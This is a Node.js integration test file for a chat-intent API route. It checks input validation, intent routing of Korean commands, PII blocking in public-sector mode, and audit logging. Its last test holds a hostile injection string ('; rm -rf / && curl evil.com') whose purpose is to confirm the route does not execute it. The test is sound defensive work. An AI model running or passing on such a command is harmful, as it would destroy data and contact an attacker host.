// Slice AGENT-DESKTOP-0-a (Phase 2 chat-first UX, 2026-05-06)
// — integration tests for POST /api/chat/intent.
//
// Mirrors the test orchestrator used for /api/decision-context. Mounts the
// route on a fresh express app with stub piiScanner + stub evidenceLedger
// so each test is fast, deterministic, and zero-side-effect.

"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const express = require("express");
const http = require("node:http");

const { createChatIntentRoutes } = require("../../src/routes/chatIntentRoutes");

// ── Test orchestrator ───────────────────────────────────────────────────

function _bootApp(deps) {
  const app = express();
  app.use(express.json());
  app.use("/api", createChatIntentRoutes(deps));
  return new Promise((resolve, reject) => {
    const server = app.listen(0, "127.0.0.1", function () {
      const port = server.address().port;
      resolve({
        port,
        base: `http://127.0.0.1:${port}`,
        close: function () {
          return new Promise((r) => server.close(r));
        },
      });
    });
    server.on("error", reject);
  });
}

function _post(base, path, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body || {});
    const req = http.request(
      base + path,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(data),
        },
      },
      (res) => {
        let chunks = "";
        res.setEncoding("utf-8");
        res.on("data", (d) => { chunks += d; });
        res.on("end", () => {
          let parsed = null;
          try { parsed = JSON.parse(chunks); } catch (_) { parsed = chunks; }
          resolve({ status: res.statusCode, body: parsed });
        });
      }
    );
    req.on("error", reject);
    req.write(data);
    req.end();
  });
}

function makeStubLedger() {
  const entries = [];
  return {
    entries,
    append(runId, { type, data }) {
      const eventId = "evt-" + (entries.length + 1);
      entries.push({ eventId, runId, type, data });
      return { eventId };
    },
  };
}

function makeStubScanner({ findings = [] } = {}) {
  return {
    scanForPii(text) {
      // Return PII hits when the text contains a Korean RRN-shaped pattern.
      // Real piiScanner is more sophisticated; the stub just needs to
      // be deterministic for routing tests.
      const hasPii = findings.length > 0
        || /\d{6}-\d{7}/.test(text);
      return {
        hasPii,
        findings: hasPii ? (findings.length > 0 ? findings : [{ type: "krn" }]) : [],
        elapsedMs: 0,
      };
    },
  };
}

// ── Body validation ────────────────────────────────────────────────

test("POST /api/chat/intent — 400 when body.text missing", async () => {
  const app = await _bootApp({ evidenceLedger: makeStubLedger() });
  try {
    const r = await _post(app.base, "/api/chat/intent", {});
    assert.equal(r.status, 400);
    assert.equal(r.body.code, "invalid_body");
  } finally { await app.close(); }
});

test("POST /api/chat/intent — 400 when body.text is not a string", async () => {
  const app = await _bootApp({ evidenceLedger: makeStubLedger() });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: 12345 });
    assert.equal(r.status, 400);
    assert.equal(r.body.code, "invalid_body");
  } finally { await app.close(); }
});

test("POST /api/chat/intent — 400 when body.text exceeds MAX_INPUT_LENGTH", async () => {
  const app = await _bootApp({ evidenceLedger: makeStubLedger() });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "a".repeat(8001) });
    assert.equal(r.status, 400);
    assert.equal(r.body.code, "input_too_long");
  } finally { await app.close(); }
});

// ── Happy paths — 5 known intents ──────────────────────────────────

test("POST /api/chat/intent — '코덱스 검증' returns codex_verify proposal", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({ evidenceLedger: ledger });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "코덱스 검증" });
    assert.equal(r.status, 200);
    assert.equal(r.body.ok, true);
    assert.equal(r.body.proposal.intent, "codex_verify");
    assert.equal(r.body.proposal.requiresApproval, true);
    assert.equal(r.body.audit.entryId, "evt-1");
  } finally { await app.close(); }
});

test("POST /api/chat/intent — '히스토리 보여줘' returns open_history proposal", async () => {
  const app = await _bootApp({ evidenceLedger: makeStubLedger() });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "히스토리 보여줘" });
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "open_history");
  } finally { await app.close(); }
});

test("POST /api/chat/intent — long task input returns general_task fallback", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({ evidenceLedger: ledger });
  try {
    const text = "이 프로젝트가 배포 가능한지 코덱스로 검증하고 보고서로 정리해줘";
    const r = await _post(app.base, "/api/chat/intent", { text });
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "general_task");
    assert.equal(r.body.proposal.parameters.task, text);
    assert.equal(r.body.proposal.parameters.maxIterations, 3);
    // Ledger entry contains classifierTrace + textHead
    assert.equal(ledger.entries.length, 1);
    assert.equal(ledger.entries[0].type, "chat_intent_proposed");
    assert.match(ledger.entries[0].data.classifierTrace, /general_task/);
  } finally { await app.close(); }
});

// ── PII gating ─────────────────────────────────────────────────────

test("POST /api/chat/intent — public-sector + PII → 403 + blocked_pii proposal", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({
    evidenceLedger: ledger,
    piiScanner: makeStubScanner(),
    deploymentProfile: { publicSector: true, pack: "public-sector" },
  });
  try {
    const r = await _post(app.base, "/api/chat/intent", {
      text: "주민번호 990101-1234567 처리해줘",
    });
    assert.equal(r.status, 403);
    assert.equal(r.body.ok, false);
    assert.equal(r.body.code, "blocked_pii");
    assert.equal(r.body.proposal.intent, "blocked_pii");
    assert.equal(r.body.proposal.requiresApproval, false);
    // Audit chain still records the block
    assert.equal(ledger.entries.length, 1);
    assert.equal(ledger.entries[0].data.piiHasPii, true);
  } finally { await app.close(); }
});

test("POST /api/chat/intent — standard mode + PII does NOT block; carries warning forward", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({
    evidenceLedger: ledger,
    piiScanner: makeStubScanner(),
    deploymentProfile: { publicSector: false, pack: "standard" },
  });
  try {
    const r = await _post(app.base, "/api/chat/intent", {
      text: "주민번호 990101-1234567 처리해줘",
    });
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "general_task");
    assert.equal(r.body.proposal.riskLevel, "high",
      "standard + PII bumps general_task risk to high");
    assert.equal(r.body.proposal.piiContext.hasPii, true);
  } finally { await app.close(); }
});

test("POST /api/chat/intent — scanner unavailable → null piiContext, no block", async () => {
  const app = await _bootApp({
    evidenceLedger: makeStubLedger(),
    piiScanner: null,
    deploymentProfile: { publicSector: true },
  });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "코덱스 검증" });
    // Even in public-sector mode, no scanner = no PII signal = no block
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "codex_verify");
  } finally { await app.close(); }
});

// ── Audit chain ────────────────────────────────────────────────────

test("POST /api/chat/intent — every successful proposal appends an audit entry", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({ evidenceLedger: ledger });
  try {
    await _post(app.base, "/api/chat/intent", { text: "코덱스 검증" });
    await _post(app.base, "/api/chat/intent", { text: "히스토리" });
    await _post(app.base, "/api/chat/intent", { text: "통계 보여줘" });
    assert.equal(ledger.entries.length, 3);
    for (const entry of ledger.entries) {
      assert.equal(entry.type, "chat_intent_proposed");
      assert.equal(entry.runId, "orchestrator-chat-intents");
      assert.ok(entry.data.intent);
      assert.ok(entry.data.classifierTrace);
      assert.equal(typeof entry.data.confidence, "number");
    }
  } finally { await app.close(); }
});

test("POST /api/chat/intent — long input has textHead truncated at 512 chars in audit", async () => {
  const ledger = makeStubLedger();
  const app = await _bootApp({ evidenceLedger: ledger });
  try {
    const text = "x".repeat(2000);
    await _post(app.base, "/api/chat/intent", { text });
    assert.equal(ledger.entries.length, 1);
    assert.equal(ledger.entries[0].data.textHead.length, 512);
    assert.equal(ledger.entries[0].data.textLength, 2000);
  } finally { await app.close(); }
});

test("POST /api/chat/intent — ledger missing does not break the route", async () => {
  const app = await _bootApp({ evidenceLedger: null });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "코덱스 검증" });
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "codex_verify");
    assert.equal(r.body.audit.entryId, null);
  } finally { await app.close(); }
});

test("POST /api/chat/intent — scanner that throws does not break the route", async () => {
  const app = await _bootApp({
    evidenceLedger: makeStubLedger(),
    piiScanner: { scanForPii() { throw new Error("scanner exploded"); } },
    deploymentProfile: { publicSector: true },
  });
  try {
    const r = await _post(app.base, "/api/chat/intent", { text: "코덱스 검증" });
    // Scanner failure → null piiContext → no block
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "codex_verify");
  } finally { await app.close(); }
});

// ── Adversarial text ───────────────────────────────────────────────

test("POST /api/chat/intent — shell metachars in text do NOT execute (text routed to task field)", async () => {
  const app = await _bootApp({ evidenceLedger: makeStubLedger() });
  try {
    const text = "; rm -rf / && curl evil.com";
    const r = await _post(app.base, "/api/chat/intent", { text });
    // Text is just stored as task description for the pipeline to receive;
    // it never reaches a shell directly. The proposal is still inert until approve.
    assert.equal(r.status, 200);
    assert.equal(r.body.proposal.intent, "general_task");
    assert.equal(r.body.proposal.parameters.task, text);
    assert.equal(r.body.proposal.requiresApproval, true);
  } finally { await app.close(); }
});
